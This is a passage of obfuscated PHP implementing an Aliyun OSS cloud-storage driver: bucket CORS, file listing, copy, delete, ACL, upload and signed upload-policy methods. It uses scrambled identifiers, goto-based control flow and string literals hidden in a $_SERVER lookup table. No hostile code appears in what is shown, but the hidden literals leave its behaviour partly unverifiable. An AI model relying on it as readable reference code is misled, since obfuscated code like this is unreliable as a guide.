eË¨ ©Ÿ½Ò; FÔÚÜ‰ˆ¦©: if (!$c¿¯ãêÍë || !($c“Ü°À‡îÚ = $c¿¯ãêÍë->getRules())) { return null; } $dŠ¯îæÊ· = $c“Ü°À‡îÚ[0]->getAllowedOrigins(); $AôºİË‰Á´ = $c“Ü°À‡îÚ[0]->getAllowedMethods(); goto Dß…À¸åÊ; aÇŒÏ‘˜È: $AöÃ›ÄÈ²˜ =& $_SERVER[Ö‘Øù]; $c¿¯ãêÍë = null; try { $c¿¯ãêÍë = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $dÓ’‘ˆŒ) { return null; } goto FÔÚÜ‰ˆ¦©; eË¨ ©Ÿ½Ò: return array($AöÃ›ÄÈ²˜[181] => isset($dŠ¯îæÊ·[0]) ? $dŠ¯îæÊ·[0] : $AöÃ›ÄÈ²˜[33], $AöÃ›ÄÈ²˜[185] => $AôºİË‰Á´, $AöÃ›ÄÈ²˜[1303] => $C§ÀÕšÀŒ, $AöÃ›ÄÈ²˜[1304] => isset($c°šÅ£Ò•Ä[0]) ? $c°šÅ£Ò•Ä[0] : $AöÃ›ÄÈ²˜[33], $AöÃ›ÄÈ²˜[183] => isset($Bˆ¤µÏº›ˆ[0]) ? $Bˆ¤µÏº›ˆ[0] : $AöÃ›ÄÈ²˜[33]); goto BÍ™Ÿƒ²ª±; BÍ™Ÿƒ²ª±: } public function isBucketCors() { goto F´é²«‡™; bëÌ…ì¿ßç: $E¹ğ¶½ŒÏ = array($E‚ÎÇÍ¥®“[186], $E‚ÎÇÍ¥®“[187], $E‚ÎÇÍ¥®“[188], $E‚ÎÇÍ¥®“[189], $E‚ÎÇÍ¥®“[190]); $CëÇÜ•˜Â = array_diff($E¹ğ¶½ŒÏ, $FîÜå³½ù); return empty($CëÇÜ•˜Â); goto EáØ™‰¶; AÃ©åº™ƒÅ: if ($eÁ¬¬ §“Ò[$E‚ÎÇÍ¥®“[181]] != $E‚ÎÇÍ¥®“[182] || $eÁ¬¬ §“Ò[$E‚ÎÇÍ¥®“[183]] != $E‚ÎÇÍ¥®“[182]) { return !1; } $FîÜå³½ù = array_map($E‚ÎÇÍ¥®“[184], $eÁ¬¬ §“Ò[$E‚ÎÇÍ¥®“[185]]); if (!is_array($FîÜå³½ù)) { $FîÜå³½ù = array(); } goto bëÌ…ì¿ßç; F´é²«‡™: $E‚ÎÇÍ¥®“ =& $_SERVER[Ö‘Øù]; $eÁ¬¬ §“Ò = $this->getBucketCors(); if (!$eÁ¬¬ §“Ò || !is_array($eÁ¬¬ §“Ò)) { return !1; } goto AÃ©åº™ƒÅ; EáØ™‰¶: } public function mkfile($BÄ¯Âèìø­, $eô¾ŠÆ‡„› = '', $eºÍ¹ºÒ¸â = REPEAT_RENAME) { $b‘™÷‚¢êÛ = $this->setContent($BÄ¯Âèìø­, $eô¾ŠÆ‡„›); if ($b‘™÷‚¢êÛ !== !1) { return $this->getPathOuter($BÄ¯Âèìø­); } return !1; } public function mkdir($cËŠ¤ñ¸¼, $EŸñëÊà‡¢ = REPEAT_SKIP) { if ($this->_isFolder($cËŠ¤ñ¸¼)) { return $this->getPathOuter($cËŠ¤ñ¸¼); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($cËŠ¤ñ¸¼)); } catch (OSS\Core\OssException $b…°ù›äˆ) { return !1; } return $this->getPathOuter($cËŠ¤ñ¸¼); } private function fileList($Dâ‹À½™ƒ, $E–ë¦ƒŒƒİ = '', $c¾ä“¨Ø±Ñ = 0) { goto F®“·²’ôÛ; fÄ°‡–¡Ì: $c…ñËÔšÌ‡ = $D´ ŞÎİºì[33]; $A‚“ĞšÀ¼° = 1000; $f÷Õª°‚ò = $this->listItemCache === !1 ? !1 : !0; goto DÜ•àÓïÈ¡; aš†Ë¦ÖÎ¿: return array($D´ ŞÎİºì[75] => $dùÃÕ»Ì¼, $D´ ŞÎİºì[74] => $díà¤ëÜå´); goto E­àÑ»ÄË; DÜ•àÓïÈ¡: $dùÃÕ»Ì¼ = $díà¤ëÜå´ = array(); while (!0) { check_abort(); $B²ºëÖ¤ö› = array($D´ ŞÎİºì[1305] => $E–ë¦ƒŒƒİ, $D´ ŞÎİºì[1306] => $a£°õ ƒô, $D´ ŞÎİºì[1307] => $A‚“ĞšÀ¼°, $D´ ŞÎİºì[1308] => $c…ñËÔšÌ‡); try { $F¡’¯ÁíÀ¸ = $this->client->listObjects($this->bucket, $B²ºëÖ¤ö›); } catch (OSS\Core\OssException $bŸ†Ï¶ÙÌí) { break; } $c…ñËÔšÌ‡ = $F¡’¯ÁíÀ¸->getNextMarker(); $e÷Œàˆ¾ØÇ = $F¡’¯ÁíÀ¸->getObjectList(); $b™ƒÓĞ„·› = $F¡’¯ÁíÀ¸->getPrefixList(); foreach ($e÷Œàˆ¾ØÇ as $FˆÈœêÙƒŞ) { goto Cß‡™íäÑ¹; Cß‡™íäÑ¹: if ($FˆÈœêÙƒŞ->getKey() == $a£°õ ƒô) { continue; } $EŸù½„Ë«± = $FˆÈœêÙƒŞ->getKey(); $AššîöóÓ = $FˆÈœêÙƒŞ->getSize(); goto a‘£ÏÑ²ì; a‘£ÏÑ²ì: $Dè¥ôƒŞ‘¸ = $FˆÈœêÙƒŞ->getLastModified(); $F‹Ô¦¿…§Ì = $c¾ä“¨Ø±Ñ ? array($D´ ŞÎİºì[28] => $EŸù½„Ë«±, $D´ ŞÎİºì[78] => $AššîöóÓ, $D´ ŞÎİºì[197] => strtotime($Dè¥ôƒŞ‘¸)) : $EŸù½„Ë«±; $F¡·†É¦¢Æ = $AššîöóÓ == 0 && substr($EŸù½„Ë«±, strlen($EŸù½„Ë«±) - 1, 1) == $D´ ŞÎİºì[8] ? !0 : !1; goto FéÊÈ«»ŞŠ; FéÊÈ«»ŞŠ: if ($f÷Õª°‚ò) { $this->cacheMethod($D´ ŞÎİºì[199], $EŸù½„Ë«±, $F¡·†É¦¢Æ); $this->cacheMethod($D´ ŞÎİºì[200], $EŸù½„Ë«±, array($D´ ŞÎİºì[78] => $AššîöóÓ, $D´ ŞÎİºì[1309] => $AššîöóÓ, $D´ ŞÎİºì[84] => strtotime($Dè¥ôƒŞ‘¸), $D´ ŞÎİºì[1310] => $Dè¥ôƒŞ‘¸)); } if ($F¡·†É¦¢Æ) { $dùÃÕ»Ì¼[] = $EŸù½„Ë«±; continue; } $díà¤ëÜå´[] = $F‹Ô¦¿…§Ì; goto f¥Êğ÷—Í; f¥Êğ÷—Í: } foreach ($b™ƒÓĞ„·› as $f¦ô“¬àé) { $dùÃÕ»Ì¼[] = $f¦ô“¬àé->getPrefix(); if ($f÷Õª°‚ò) { $this->cacheMethod($D´ ŞÎİºì[199], $EŸù½„Ë«±, !0); } } if ($c…ñËÔšÌ‡ === $D´ ŞÎİºì[33]) { break; } } if ($f÷Õª°‚ò) { $this->cacheMethod($D´ ŞÎİºì[199], $Dâ‹À½™ƒ, !0); } goto aš†Ë¦ÖÎ¿; F®“·²’ôÛ: $D´ ŞÎİºì =& $_SERVER[Ö‘Øù]; $Dâ‹À½™ƒ = trim($Dâ‹À½™ƒ, $D´ ŞÎİºì[8]); $a£°õ ƒô = empty($Dâ‹À½™ƒ) && $Dâ‹À½™ƒ !== $D´ ŞÎİºì[191] ? $D´ ŞÎİºì[33] : $Dâ‹À½™ƒ . $D´ ŞÎİºì[8]; goto fÄ°‡–¡Ì; E­àÑ»ÄË: } public function copyFile($eçêÎ‰Ü’Ş, $Dóµ‹°é›Š) { $CÜÇáĞ´© = $this->size($eçêÎ‰Ü’Ş); if ($CÜÇáĞ´© < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $eçêÎ‰Ü’Ş, $this->bucket, $this->pathEncode($Dóµ‹°é›Š)); } catch (OSS\Core\OssException $eÚğ»âğÒé) { return !1; } return $this->getPathOuter($Dóµ‹°é›Š); } $D·øŞğõŒ = $this->multiCopyObject($eçêÎ‰Ü’Ş, $Dóµ‹°é›Š, $CÜÇáĞ´©); return $D·øŞğõŒ ? $this->getPathOuter($Dóµ‹°é›Š) : !1; } private function multiCopyObject($C¾ùŒõÍ—Œ, $FÎĞàåÃ, $C¤äÑ›º¥Ò) { $dŒ¸ÀÒ†’’ =& $_SERVER[Ö‘Øù]; try { goto eÕë‹È•’°; c¿©¿¼Â›÷: $Eíö…¼»¯³ = 1; $e¨×ä­îóœ = 0; $Cö£¼‹ëµ¦ = array(); goto cä‡¤®æ¿; c‡¸áŒïá´: $a¨­ÙÎÍ¡œ = array(); foreach ($Cö£¼‹ëµ¦ as $C‹šÑÆËí => $cÕõ‚¥Ëæ) { $a¨­ÙÎÍ¡œ[] = array($dŒ¸ÀÒ†’’[1315] => $C‹šÑÆËí + 1, $dŒ¸ÀÒ†’’[1316] => $cÕõ‚¥Ëæ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($FÎĞàåÃ), $b÷òÕ²‡ë¿, $a¨­ÙÎÍ¡œ); goto c¾Ø¦½áí¨; eÕë‹È•’°: $bµ“·â„İ = array(); if ($d­Şœ¼”œ = $this->hashMd5($C¾ùŒõÍ—Œ)) { $bµ“·â„İ = array(OSS\OssClient::OSS_HEADERS => array($dŒ¸ÀÒ†’’[1311] => $d­Şœ¼”œ)); } $b÷òÕ²‡ë¿ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($FÎĞàåÃ), $bµ“·â„İ); goto c¿©¿¼Â›÷; cä‡¤®æ¿: $a¤æ‘…óš¹ = 1024 * 1024 * 10; $F‚è¬¾ã = $this->client->generateMultiuploadParts($C¤äÑ›º¥Ò, $a¤æ‘…óš¹); foreach ($F‚è¬¾ã as $C‹šÑÆËí => $eçŠŞŒ¦ë) { $fç«Ğ»ÂäÚ = $e¨×ä­îóœ + (int) $eçŠŞŒ¦ë[$dŒ¸ÀÒ†’’[1312]]; $FÓô‹µŒãë = (int) $eçŠŞŒ¦ë[$dŒ¸ÀÒ†’’[335]] + $fç«Ğ»ÂäÚ - 1; $eêä”«â¡ê = array($dŒ¸ÀÒ†’’[1313] => $fç«Ğ»ÂäÚ, $dŒ¸ÀÒ†’’[1314] => $FÓô‹µŒãë); $Cö£¼‹ëµ¦[] = $this->client->uploadPartCopy($this->bucket, $C¾ùŒõÍ—Œ, $this->bucket, $this->pathEncode($FÎĞàåÃ), $Eíö…¼»¯³, $b÷òÕ²‡ë¿, $eêä”«â¡ê); $Eíö…¼»¯³ = $Eíö…¼»¯³ + 1; } goto c‡¸áŒïá´; c¾Ø¦½áí¨: } catch (OSS\Core\OssException $c×Üá‚) { return !1; } return !0; } public function moveFile($F‹Õ¾óËÏñ, $bø›œ‘“œ•) { if ($this->copyFile($F‹Õ¾óËÏñ, $bø›œ‘“œ•)) { $this->remove($F‹Õ¾óËÏñ); return $this->getPathOuter($bø›œ‘“œ•); } return !1; } public function delFile($f±Şãáßò) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($f±Şãáßò)); } catch (OSS\Core\OssException $B«÷¬¬ƒğ) { return !1; } return !0; } public function delFolder($C­î¦†Ùšâ) { goto Fµ„õÃ´·½; cíİà‘¨ØÍ: if (!empty($C­î¦†Ùšâ) && $C­î¦†Ùšâ !== $a”İÖØÊï[191] && !in_array($C“×‡š±ìŸ, $EëÛÒŸ˜[$a”İÖØÊï[75]])) { $EëÛÒŸ˜[$a”İÖØÊï[75]][] = $C“×‡š±ìŸ; } $DÑˆ¼áÕñÍ = $this->delByBatch($EëÛÒŸ˜[$a”İÖØÊï[74]]); if (!$DÑˆ¼áÕñÍ) { return !1; } goto A”ì·šÖƒ; dˆŸİİâœ: $EëÛÒŸ˜ = $this->fileList($C­î¦†Ùšâ); $this->listItemCache = !0; $C“×‡š±ìŸ = trim($C­î¦†Ùšâ, $a”İÖØÊï[8]) . $a”İÖØÊï[8]; goto cíİà‘¨ØÍ; A”ì·šÖƒ: $DÑˆ¼áÕñÍ = $this->delByBatch($EëÛÒŸ˜[$a”İÖØÊï[75]]); if (!$DÑˆ¼áÕñÍ) { return !1; } return $this->delFile($C“×‡š±ìŸ); goto e®öÌêÛÔ»; Fµ„õÃ´·½: $a”İÖØÊï =& $_SERVER[Ö‘Øù]; if (!$this->exist($C­î¦†Ùšâ)) { return !0; } $this->listItemCache = !1; goto dˆŸİİâœ; e®öÌêÛÔ»: } private function delByBatch($B‹É‹ƒêô) { foreach (array_chunk($B‹É‹ƒêô, 1000) as $F¹‰®Šä£À) { try { $this->client->deleteObjects($this->bucket, $F¹‰®Šä£À); } catch (OSS\Core\OssException $cÍ»¢Ú–†õ) { return !1; } } return !0; } public function rename($A«õĞì×Æ, $A´ ŠøÇ¯à) { return $this->renameObject($A«õĞì×Æ, $A´ ŠøÇ¯à); } private function fileInfo($aÒë†ôŒÔ, $Eø£Šñ™ğ = false, $eÎº¾°ëÖ¤ = array()) { goto eÁÍÀßÎ½; f¿ãÃÖÔŒ•: $cå­î§÷ŸÒ[$cèÔîÑ·â[194]] = $cå­î§÷ŸÒ[$cèÔîÑ·â[84]] = 0; $cå­î§÷ŸÒ[$cèÔîÑ·â[195]] = $cå­î§÷ŸÒ[$cèÔîÑ·â[196]] = !0; if (empty($eÎº¾°ëÖ¤)) { $cßç¶¨Ú‰Æ = $this->objectMeta($aÒë†ôŒÔ); if (!$cßç¶¨Ú‰Æ) { return $cå­î§÷ŸÒ; } $eÎº¾°ëÖ¤ = array($cèÔîÑ·â[84] => strtotime($cßç¶¨Ú‰Æ[$cèÔîÑ·â[1310]]), $cèÔîÑ·â[78] => $cßç¶¨Ú‰Æ[$cèÔîÑ·â[1309]] + 0); } goto ašŸ³ø›‚; Fá¸ë¨»¼Â: return $cå­î§÷ŸÒ; goto fóÑ¯í®¯Œ; eÁÍÀßÎ½: $cèÔîÑ·â =& $_SERVER[Ö‘Øù]; $cå­î§÷ŸÒ = array($cèÔîÑ·â[28] => $this->pathThis($aÒë†ôŒÔ), $cèÔîÑ·â[76] => $this->getPathOuter($aÒë†ôŒÔ), $cèÔîÑ·â[29] => $cèÔîÑ·â[193], $cèÔîÑ·â[78] => isset($eÎº¾°ëÖ¤[$cèÔîÑ·â[78]]) ? $eÎº¾°ëÖ¤[$cèÔîÑ·â[78]] : 0, $cèÔîÑ·â[168] => $this->ext($aÒë†ôŒÔ)); if ($Eø£Šñ™ğ) { return $cå­î§÷ŸÒ; } goto f¿ãÃÖÔŒ•; ašŸ³ø›‚: if (isset($eÎº¾°ëÖ¤[$cèÔîÑ·â[78]])) { $cå­î§÷ŸÒ[$cèÔîÑ·â[78]] = $eÎº¾°ëÖ¤[$cèÔîÑ·â[78]]; } if (isset($eÎº¾°ëÖ¤[$cèÔîÑ·â[84]])) { $cå­î§÷ŸÒ[$cèÔîÑ·â[84]] = $eÎº¾°ëÖ¤[$cèÔîÑ·â[84]]; } if (isset($eÎº¾°ëÖ¤[$cèÔîÑ·â[197]]) && !trim($cå­î§÷ŸÒ[$cèÔîÑ·â[84]])) { $cå­î§÷ŸÒ[$cèÔîÑ·â[84]] = $eÎº¾°ëÖ¤[$cèÔîÑ·â[197]]; } goto Fá¸ë¨»¼Â; fóÑ¯í®¯Œ: } private function folderInfo($Bïé ÕÜµ, $FÎØ„‡‰¸ = false, $E£ÛØÍÌ† = array()) { goto f¼¢š’ˆ…ƒ; f¼¢š’ˆ…ƒ: $c‹¶Òà’ÍÇ =& $_SERVER[Ö‘Øù]; $fæ×“¹ë = array($c‹¶Òà’ÍÇ[28] => $this->pathThis($Bïé ÕÜµ), $c‹¶Òà’ÍÇ[76] => $this->getPathOuter($c‹¶Òà’ÍÇ[8] . $Bïé ÕÜµ), $c‹¶Òà’ÍÇ[29] => $c‹¶Òà’ÍÇ[77]); if ($FÎØ„‡‰¸) { return $fæ×“¹ë; } goto EŞø¸‹À‚…; EŞø¸‹À‚…: $fæ×“¹ë[$c‹¶Òà’ÍÇ[194]] = $fæ×“¹ë[$c‹¶Òà’ÍÇ[84]] = 0; $fæ×“¹ë[$c‹¶Òà’ÍÇ[195]] = $fæ×“¹ë[$c‹¶Òà’ÍÇ[196]] = !0; if (empty($E£ÛØÍÌ†)) { $Bïé ÕÜµ = rtrim($Bïé ÕÜµ, $c‹¶Òà’ÍÇ[8]) . $c‹¶Òà’ÍÇ[8]; $aÈ‹Ñ£‘¢” = $this->objectMeta($Bïé ÕÜµ); if (!$aÈ‹Ñ£‘¢”) { return $fæ×“¹ë; } $E£ÛØÍÌ† = array($c‹¶Òà’ÍÇ[194] => $aÈ‹Ñ£‘¢”[$c‹¶Òà’ÍÇ[506]][$c‹¶Òà’ÍÇ[1317]], $c‹¶Òà’ÍÇ[84] => strtotime($aÈ‹Ñ£‘¢”[$c‹¶Òà’ÍÇ[1310]])); } goto AÕ‹¸ÊÛÒ¥; AÕ‹¸ÊÛÒ¥: if (isset($E£ÛØÍÌ†[$c‹¶Òà’ÍÇ[84]])) { $fæ×“¹ë[$c‹¶Òà’ÍÇ[84]] = $E£ÛØÍÌ†[$c‹¶Òà’ÍÇ[84]]; } if (isset($E£ÛØÍÌ†[$c‹¶Òà’ÍÇ[194]])) { $fæ×“¹ë[$c‹¶Òà’ÍÇ[194]] = $E£ÛØÍÌ†[$c‹¶Òà’ÍÇ[194]]; } return $fæ×“¹ë; goto A›†¶ĞÙ¯È; A›†¶ĞÙ¯È: } public function listPath($cÄ‚µàŸ–, $EŒá…°ôß˜ = false) { $f²¸—Á–± =& $_SERVER[Ö‘Øù]; $E ·‡Šä÷ = $this->fileList($cÄ‚µàŸ–, $f²¸—Á–±[8], !0); foreach ($E ·‡Šä÷[$f²¸—Á–±[75]] as $a–‘ÄŞ¥ˆ¦ => $c•È´æ×à¬) { $E ·‡Šä÷[$f²¸—Á–±[75]][$a–‘ÄŞ¥ˆ¦] = $this->folderInfo($c•È´æ×à¬, $EŒá…°ôß˜, $c•È´æ×à¬); } foreach ($E ·‡Šä÷[$f²¸—Á–±[74]] as $a–‘ÄŞ¥ˆ¦ => $c•È´æ×à¬) { $E ·‡Šä÷[$f²¸—Á–±[74]][$a–‘ÄŞ¥ˆ¦] = $this->fileInfo($c•È´æ×à¬[$f²¸—Á–±[28]], $EŒá…°ôß˜, $c•È´æ×à¬); } return $E ·‡Šä÷; } public function has($eñµª¦¬¸‘, $A²È£Ì†Õ = false, $F¤³¾Ö“²ˆ = true) { goto c‘‚·ÜŞÑŠ; c‘‚·ÜŞÑŠ: $DÖ²‘£ÑÓ =& $_SERVER[Ö‘Øù]; $eñµª¦¬¸‘ = trim($eñµª¦¬¸‘, $DÖ²‘£ÑÓ[8]); $D´÷‹‡Øˆ = empty($eñµª¦¬¸‘) && $eñµª¦¬¸‘ !== $DÖ²‘£ÑÓ[191] ? $DÖ²‘£ÑÓ[33] : $eñµª¦¬¸‘ . $DÖ²‘£ÑÓ[8]; goto FéÉáÍ×’; FéÉáÍ×’: $BÕğöñá¨ò = $DÖ²‘£ÑÓ[33]; $dö¶‰ÈÈ¥¯ = 500; $dóÖÔ»ÏùÁ = $BŞİ‚¥ˆ„ = 0; goto c­áÃ“ßó; c­áÃ“ßó: while (!0) { check_abort(); $c»“ŠĞ§Ÿ = array($DÖ²‘£ÑÓ[1305] => $DÖ²‘£ÑÓ[8], $DÖ²‘£ÑÓ[1306] => $D´÷‹‡Øˆ, $DÖ²‘£ÑÓ[1307] => $dö¶‰ÈÈ¥¯, $DÖ²‘£ÑÓ[1308] => $BÕğöñá¨ò); try { $F¦¬–¯Ğ» = $this->client->listObjects($this->bucket, $c»“ŠĞ§Ÿ); } catch (OSS\Core\OssException $c“¨¥ŒâÌ) { break; } $BÕğöñá¨ò = $F¦¬–¯Ğ»->getNextMarker(); $A‡´ê‡ŞÉÚ = $F¦¬–¯Ğ»->getObjectList(); $cÄÆ…Î›é = $F¦¬–¯Ğ»->getPrefixList(); if ($A²È£Ì†Õ) { if (count($A‡´ê‡ŞÉÚ) > 1 || count($A‡´ê‡ŞÉÚ) == 1 && $A‡´ê‡ŞÉÚ[0]->getKey() != $D´÷‹‡Øˆ) { $dóÖÔ»ÏùÁ += count($A‡´ê‡ŞÉÚ) - 1; } if (!empty($cÄÆ…Î›é)) { $BŞİ‚¥ˆ„ += count($cÄÆ…Î›é); } if ($BÕğöñá¨ò === $DÖ²‘£ÑÓ[33]) { break; } continue; } if ($F¤³¾Ö“²ˆ) { if (!empty($A‡´ê‡ŞÉÚ)) { if (count($A‡´ê‡ŞÉÚ) > 1 || $A‡´ê‡ŞÉÚ[0]->getKey() != $D´÷‹‡Øˆ) { return !0; } } } else { if (!empty($cÄÆ…Î›é)) { return !0; } } if ($BÕğöñá¨ò === $DÖ²‘£ÑÓ[33]) { break; } } if ($A²È£Ì†Õ) { return array($DÖ²‘£ÑÓ[203] => $dóÖÔ»ÏùÁ, $DÖ²‘£ÑÓ[204] => $BŞİ‚¥ˆ„); } return !1; goto A¬°‚¸ä“; A¬°‚¸ä“: } public function listAll($D» ò„ß‹‘) { $DÖëô¥Ô†Ë =& $_SERVER[Ö‘Øù]; $aÄ‹ï‚ƒø„ = $this->fileList($D» ò„ß‹‘, $DÖëô¥Ô†Ë[33], !0); $a‚›İ›ë¢Ù = array(); foreach ($aÄ‹ï‚ƒø„[$DÖëô¥Ô†Ë[74]] as $D®ÅÂ±ˆóš) { $a‚›İ›ë¢Ù[$D®ÅÂ±ˆóš[$DÖëô¥Ô†Ë[28]]] = $D®ÅÂ±ˆóš[$DÖëô¥Ô†Ë[78]]; } foreach ($aÄ‹ï‚ƒø„[$DÖëô¥Ô†Ë[75]] as $D®ÅÂ±ˆóš) { if (is_string($D®ÅÂ±ˆóš)) { $a‚›İ›ë¢Ù[$D®ÅÂ±ˆóš] = 0; } } return $this->listAllFiles($D» ò„ß‹‘, array_keys($a‚›İ›ë¢Ù), $a‚›İ›ë¢Ù); } public function canRead($eùµ¤©ñ¬š) { $Fƒ ¾‹– =& $_SERVER[Ö‘Øù]; $e¤Å‚ÈôÆù = $this->pathAcl($eùµ¤©ñ¬š); return $e¤Å‚ÈôÆù == $Fƒ ¾‹–[1318] || $e¤Å‚ÈôÆù == $Fƒ ¾‹–[545] ? !0 : !1; } public function canWrite($bİôÏ äÍÙ) { $bÍ´ÚÇŠ = $this->pathAcl($bİôÏ äÍÙ); return $bÍ´ÚÇŠ == $_SERVER[Ö‘Øù][545] ? !0 : !1; } public function pathAcl($dÚ´¶®àÕÇ) { goto aŸÇÃ½œŸ ; DÉ¸¶¸áÇ: return $b‹ã×ÛÃ²„; goto FÖ½Å×¢Ğ; D÷Ö£İÈ¥Ü: $b‹ã×ÛÃ²„ = $CƒæŒÊ§Æ÷ == $EèÜŞÚó™©[34] ? $this->bucketAcl : $CƒæŒÊ§Æ÷; if ($b‹ã×ÛÃ²„ == $EèÜŞÚó™©[1319]) { return $EèÜŞÚó™©[1318]; } if ($b‹ã×ÛÃ²„ == $EèÜŞÚó™©[1320]) { return $EèÜŞÚó™©[545]; } goto DÉ¸¶¸áÇ; aŸÇÃ½œŸ : $EèÜŞÚó™© =& $_SERVER[Ö‘Øù]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $CƒæŒÊ§Æ÷ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($dÚ´¶®àÕÇ)); } catch (OSS\Core\OssException $FˆÌ´éƒî¾) { return !1; } goto D÷Ö£İÈ¥Ü; FÖ½Å×¢Ğ: } private function chmodPath($báó’Ë¦, $Fğ…Àå¶’¦ = '') { $DÕÕƒ‹ÌÛ© =& $_SERVER[Ö‘Øù]; $E„†Û¹Ô†Ó = empty($Fğ…Àå¶’¦) ? $DÕÕƒ‹ÌÛ©[1320] : $Fğ…Àå¶’¦; $DåÈ…ÄêÃï = array($DÕÕƒ‹ÌÛ©[34], $DÕÕƒ‹ÌÛ©[192], $DÕÕƒ‹ÌÛ©[1319], $DÕÕƒ‹ÌÛ©[1320]); if (!in_array($E„†Û¹Ô†Ó, $DåÈ…ÄêÃï)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($báó’Ë¦), $E„†Û¹Ô†Ó); } catch (OSS\Core\OssException $D¾åÙ•ã¡ì) { return !1; } return !0; } public function getContent($eï¼‘µ©ä…) { return $this->fileSubstr($eï¼‘µ©ä…, -1); } public function setContent($A¯Ïë¾ŞµŸ, $F™¡¸äœ˜ã = '') { $FÊ‹öÇ† =& $_SERVER[Ö‘Øù]; try { $B‚‡°©•İ  = $this->trafficLimit($FÊ‹öÇ†[1321]); $aŞºç½ï°Ô = $this->client->putObject($this->bucket, $this->pathEncode($A¯Ïë¾ŞµŸ), $F™¡¸äœ˜ã, $B‚‡°©•İ ); } catch (OSS\Core\OssException $F‚ê×Ñâß•) { return !1; } $EÈ‚âŸÀëÖ = array($FÊ‹öÇ†[1311] => trim($aŞºç½ï°Ô[$FÊ‹öÇ†[1322]], $FÊ‹öÇ†[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A¯Ïë¾ŞµŸ))); $this->updateObjMeta($A¯Ïë¾ŞµŸ, $EÈ‚âŸÀëÖ); return isset($aŞºç½ï°Ô[$FÊ‹öÇ†[1323]][$FÊ‹öÇ†[1270]]) ? !0 : !1; } private function updateObjMeta($F“ŸáÈƒùâ, $eÀù‡µ¶ß¹) { $F“ŸáÈƒùâ = $this->pathEncode($F“ŸáÈƒùâ); try { $Fïµ±ÃØ±ƒ = array(OSS\OssClient::OSS_HEADERS => $eÀù‡µ¶ß¹); $this->client->copyObject($this->bucket, $F“ŸáÈƒùâ, $this->bucket, $F“ŸáÈƒùâ, $Fïµ±ÃØ±ƒ); } catch (OSS\Core\OssException $C×±§á) { return !1; } return !0; } public function upload($D›ƒ„Üª²‰, $F·›Ø·…‘, $AØÁ­¾Ú” = false, $CÀ™”ÅŒ´† = REPEAT_REPLACE) { $EÏ‡’ù¨Ëó =& $_SERVER[Ö‘Øù]; $EªÇŠãœß = trim($D›ƒ„Üª²‰, $EÏ‡’ù¨Ëó[8]); $Fèâéˆœİ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($EÏ‡’ù¨Ëó[1311] => @md5_file($F·›Ø·…‘)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D›ƒ„Üª²‰))); $Fèâéˆœİ = $this->trafficLimit($EÏ‡’ù¨Ëó[1321], $Fèâéˆœİ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($EªÇŠãœß), $F·›Ø·…‘, $Fèâéˆœİ); } catch (OSS\Core\OssException $dö—î„ô) { return !1; } return $this->getPathOuter($D›ƒ„Üª²‰); } public function getHost() { $B Ç»Úó =& $_SERVER[Ö‘Øù]; $eÍ‚ÍÚ×—‚ = explode($B Ç»Úó[177], parent::getHost()); return $eÍ‚ÍÚ×—‚[0] . $B Ç»Úó[177] . $this->bucket . $B Ç»Úó[95] . $eÍ‚ÍÚ×—‚[1]; } public function uploadFormData($B«î¦««ìƒ, $E«‹ğÙ·£¬ = 3600) { goto Eâ”Šóôì; b÷‚Ÿà™’ª: $F³ˆÖÕ´ë° = base64_encode(hash_hmac($eìŒ±¹ğ‚š[230], $bÌ“Ä­Œ¨„, $this->secret, !0)); $C±¹ˆ¤äƒè = array($eìŒ±¹ğ‚š[1235] => $bÌ“Ä­Œ¨„, $eìŒ±¹ğ‚š[1327] => $this->accessKey, $eìŒ±¹ğ‚š[1231] => $eìŒ±¹ğ‚š[1223], $eìŒ±¹ğ‚š[1328] => $F³ˆÖÕ´ë°, $eìŒ±¹ğ‚š[175] => $aì”½ğÕ™¥); $C±¹ˆ¤äƒè = $this->trafficLimit($eìŒ±¹ğ‚š[1321], $C±¹ˆ¤äƒè); goto e‡”‰ä™ãª; BĞ¢­ÎÍ‹¿: $bá¹•¼»Ğ = $this->pathFather($B«î¦««ìƒ); $AÍ‘ŒâÍ¯‡ = array($eìŒ±¹ğ‚š[1225] => $eæ¦ƒÆ‰î, $eìŒ±¹ğ‚š[1226] => array(array($eìŒ±¹ğ‚š[1326], 0, $bñŸ“è¸¿), array($eìŒ±¹ğ‚š[1229], $eìŒ±¹ğ‚š[1230], $bá¹•¼»Ğ))); $bÌ“Ä­Œ¨„ = base64_encode(json_encode($AÍ‘ŒâÍ¯‡)); goto b÷‚Ÿà™’ª; F‚‚—†ƒµ: $fç˜¦™’¯Ÿ = strpos($eæ¦ƒÆ‰î, $eìŒ±¹ğ‚š[294]); $eæ¦ƒÆ‰î = substr($eæ¦ƒÆ‰î, 0, $fç˜¦™’¯Ÿ) . $eìŒ±¹ğ‚š[1325]; $bñŸ“è¸¿ = 1048576000 * 5; goto BĞ¢­ÎÍ‹¿; Eâ”Šóôì: $eìŒ±¹ğ‚š =& $_SERVER[Ö‘Øù]; if (!($aì”½ğÕ™¥ = $this->getHost())) { return !1; } $D’«’´¸µ = $E«‹ğÙ·£¬; goto Aîô¦Ø¯Ø¤; e‡”‰ä™ãª: return $C±¹ˆ¤äƒè; goto EîÅÙÇ‚×†; Aîô¦Ø¯Ø¤: $cì‡¤ÍóˆŒ = date($eìŒ±¹ğ‚š[1324], time() + $D’«’´¸µ); $a´µƒ§¾õÒ = new DateTime($cì‡¤ÍóˆŒ); $eæ¦ƒÆ‰î = $a´µƒ§¾õÒ->format(DateTime::ISO8601); goto F‚‚—†ƒµ; EîÅÙÇ‚×†: } public function multiUploadFormData($eØ¿ƒìö‹­, $BŒŠÛíóğ = 3600) { $A¼é±™ï»µ =& $_SERVER[Ö‘Øù]; if (!($f…Ì™âä¸ = $this->getHost())) { return !1; } $e÷ŒÒˆÀÖØ = 